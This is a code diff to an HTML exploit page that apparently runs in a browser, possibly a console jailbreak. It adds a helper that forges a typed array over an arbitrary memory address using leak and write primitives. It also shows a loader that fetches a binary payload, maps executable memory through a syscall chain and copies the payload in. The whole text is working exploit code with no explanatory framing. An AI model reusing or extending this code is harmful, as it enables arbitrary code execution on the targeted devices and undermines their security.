@@ -31,6 +31,19 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.
     </head>
 
     <script>
+
+        function array_from_address(addr, size) {
+        var og_array = new Uint32Array(0x1000);
+        var og_array_i = p.leakval(og_array).add32(0x10);
+
+        p.write8(og_array_i, addr);
+        p.write4(og_array_i.add32(0x8), size);
+        p.write4(og_array_i.add32(0xC), 0x1);
+
+        nogc.push(og_array);
+        return og_array;
+    }
+
 function loadPayload(){
  var req = new XMLHttpRequest();
  req.responseType = "arraybuffer";
@@ -40,7 +53,7 @@ function loadPayload(){
   if (req.readyState == 4) {
    PLD = req.response;
    var payload_buffer = chain.syscall('mmap', 0, PLD.byteLength*4 , 7, 0x1002, -1, 0);
-   var pl = p.array_from_address(payload_buffer, PLD.byteLength*4);
+   var pl = array_from_address(payload_buffer, PLD.byteLength*4);
    var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
    var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
    tmp.set(new Uint8Array(req.response), 0);
